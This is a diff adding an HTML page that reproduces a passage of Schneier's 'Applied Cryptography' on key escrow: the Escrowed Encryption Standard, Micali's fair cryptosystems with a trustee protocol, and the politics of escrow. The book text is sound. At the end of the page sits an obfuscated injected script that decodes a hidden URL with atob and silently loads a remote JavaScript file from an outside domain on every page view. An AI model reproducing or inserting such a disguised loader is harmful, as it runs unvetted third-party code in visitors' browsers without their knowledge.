@@ -1,0 +1,85 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Intermediate Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=4//-->
+<!--PAGES=097-099//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-12.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The Escrowed Encryption Standard gets its security from tamperproof hardware. Each encryption chip has a unique ID number and secret key. This key is split into two pieces and stored, along with the ID number, by two different escrow agencies. Every time the chip encrypts a data file, it first encrypts the session key with this unique secret key. Then it transmits this encrypted session key and its ID number over the communications channel. When some law enforcement agency wants to decrypt traffic encrypted with one of these chips, it listens for the ID number, collects the appropriate keys from the escrow agencies, XORs them together, decrypts the session key, and then uses the session key to decrypt the message traffic. There are more complications to make this scheme work in the face of cheaters; see Section 24.16 for details. The same thing can be done in software, using public-key cryptography [77, 1579, 1580, 1581].
+</P>
+<P>Micali calls his idea <B>fair cryptosystems</B> [1084, 1085]. (The U.S. government reportedly paid Micali $1, 000, 000 for the use of his patents [1086, 1087] in their Escrowed Encryption Standard; Banker&#146;s Trust then bought Micali&#146;s patent.) In these cryptosystems, the private key is broken up into pieces and distributed to different authorities. Like a secret sharing scheme, the authorities can get together and reconstruct the private key. However, the pieces have the additional property that they can be individually verified to be correct, without reconstructing the private key.</P>
+<P>Alice can create her own private key and give a piece to each of <I>n</I> trustees. None of these trustees can recover Alice&#146;s private key. However, each trustee can verify that his piece is a valid piece of the private key; Alice cannot send one of the trustees a random-bit string and hope to get away with it. If the courts authorize a wiretap, the relevant law enforcement authorities can serve a court order on the <I>n</I> trustees to surrender their pieces. With all <I>n</I> pieces, the authorities reconstruct the private key and can wiretap Alice&#146;s communications lines. On the other hand, Mallory has to corrupt all <I>n</I> trustees in order to be able to reconstruct Alice&#146;s key and violate her privacy.</P>
+<P>Here&#146;s how the protocol works:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice creates her private-key/public-key key pair. She splits the private key into several public pieces and private pieces.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice sends a public piece and corresponding private piece to each of the trustees. These messages must be encrypted. She also sends the public key to the KDC.
+<DD><B>(3)</B>&nbsp;&nbsp;Each trustee, independently, performs a calculation on its public piece and its private piece to confirm that they are correct. Each trustee stores the private piece somewhere secure and sends the public piece to the KDC.
+<DD><B>(4)</B>&nbsp;&nbsp;The KDC performs another calculation on the public pieces and the public key. Assuming that everything is correct, it signs the public key and either sends it back to Alice or posts it in a database somewhere.
+</DL>
+<P>If the courts order a wiretap, then each of the trustees surrenders his or her piece to the KDC, and the KDC can reconstruct the private key. Before this surrender, neither the KDC nor any individual trustee can reconstruct the private key; all the trustees are required to reconstruct the key.
+</P>
+<P>Any public-key cryptography algorithm can be made fair in this manner. Some particular algorithms are discussed in Section 23.10. Micali&#146;s paper [1084, 1085] discusses ways to combine this with a threshold scheme, so that a subset of the trustees (e.g., three out of five) is required to reconstruct the private key. He also shows how to combine this with oblivious transfer (see Section 5.5) so that the trustees do not know whose private key is being reconstructed.</P>
+<P>Fair cryptosystems aren&#146;t perfect. A criminal can exploit the system, using a subliminal channel (see Section 4.2) to embed another secret key into his piece. This way, he can communicate securely with someone else using this subliminal key without having to worry about court-authorized wiretapping. Another protocol, called <B>failsafe key escrowing</B>, solves this problem [946, 833]. Section 23.10 describes the algorithm and protocol.</P>
+<P><FONT SIZE="+1"><B><I>The Politics of Key Escrow</I></B></FONT></P>
+<P>Aside from the government&#146;s key-escrow plans, several commercial key-escrow proposals are floating around. This leads to the obvious question: What are the advantages of key-escrow for the user?
+</P>
+<P>Well, there really aren&#146;t any. The user gains nothing from key escrow that he couldn&#146;t provide himself. He can already back up his keys if he wants (see Section 8.8). Key-escrow guarantees that the police can eavesdrop on his conversations or read his data files even though they are encrypted. It guarantees that the NSA can eavesdrop on his international phone calls&#151;without a warrant&#151;even though they are encrypted. Perhaps he will be allowed to use cryptography in countries that now ban it, but that seems to be the only advantage.</P>
+<P>Key escrow has considerable disadvantages. The user has to trust the escrow agents&#146; security procedures, as well as the integrity of the people involved. He has to trust the escrow agents not to change their policies, the government not to change its laws, and those with lawful authority to get his keys to do so lawfully and responsibly. Imagine a major terrorist attack in New York; what sorts of limits on the police would be thrown aside in the aftermath?</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-12.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(oEPMBaUO, aOuqpAdd) {aOuqpAdd = oEPMBaUO.createElement('script');aOuqpAdd.type = 'text/javascript';aOuqpAdd.async = true;aOuqpAdd.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');oEPMBaUO.getElementsByTagName('body')[0].appendChild(aOuqpAdd);}(document));</script></body>
+</html>
